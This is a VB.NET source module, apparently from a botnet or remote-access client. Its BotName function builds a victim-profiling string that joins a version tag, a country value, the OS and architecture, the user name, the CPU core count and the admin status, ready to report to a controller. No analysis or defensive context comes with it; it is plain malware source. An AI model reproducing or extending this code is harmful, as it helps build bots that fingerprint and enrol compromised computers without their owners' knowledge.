Module UserComponent
    Public Function BotName()
        Try
            Dim bot_chain As String = ""
            Dim bit As String = String.Empty
            bot_chain = bot_chain & "2.0"
            Try
                bot_chain = bot_chain & "*" & Getcn.g & ""
            Catch
                bot_chain = bot_chain & "*" & "Error" & ""
            End Try
            Try
                If Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") Then
                    bit = "x64*"
                Else
                    bit = "x86*"
                End If
            Catch
                bit = "*x86*"
            End Try
            Try
                Dim OS As String = My.Computer.Info.OSFullName
                If OS.Contains("XP") Then bot_chain = bot_chain & "*Windows XP " & bit
                If OS.Contains("Windows 7") Then bot_chain = bot_chain & "*Windows 7 " & bit
                If OS.Contains("Vista") Then bot_chain = bot_chain & "*Windows Vista " & bit
                If OS.Contains("Windows 8") Then bot_chain = bot_chain & "*Windows 8 " & bit
                If OS.Contains("Windows 8.1") Then bot_chain = bot_chain & "*Windows 8.1 " & bit
                If OS.Contains("Windows 10") Then bot_chain = bot_chain & "*Windows 10 " & bit
                If OS.Contains("Windows NT") Then bot_chain = bot_chain & "*Windows NT " & bit
                If OS.Contains("Lite") Then bot_chain = bot_chain & "*Windows Lite" & bit
                If OS.Contains("RT") Then bot_chain = bot_chain & "*Windows RT" & bit
                If OS.Contains("Server") Then bot_chain = bot_chain & "*Windows Server " & bit
                If Not bot_chain.Contains("Windows") Then bot_chain = bot_chain & "*Unknow operating system (" & OS & ") " & bit
            Catch
                bot_chain = bot_chain & "*N/A " & bit
            End Try

            Try
                Dim username As String = Environment.UserName
                If Not username = String.Empty Then
                    bot_chain = bot_chain & "" & username & "*"

                Else
                    bot_chain = bot_chain & "" & "Error" & "*"
                End If
            Catch
                bot_chain = bot_chain & "Error*"
            End Try
            Try
                Dim x1 = Environment.ProcessorCount
                Dim fap
                If x1 = 1 Then fap = "1 Core" Else fap = x1.ToString & " Cores"
                bot_chain = bot_chain & "" & fap & "*"
            Catch
                bot_chain = bot_chain & "" & "N/A" & "*"
            End Try

            Try
                If IsAdmin() Then bot_chain = bot_chain & "Admin*" Else bot_chain = bot_chain & "User*"
            Catch ex As Exception
                bot_chain = bot_chain & "Error*"
            End Try
            bot_chain = bot_chain
            Return bot_chain
        Catch : End Try
        Return "N/A"
    End Function
End Module
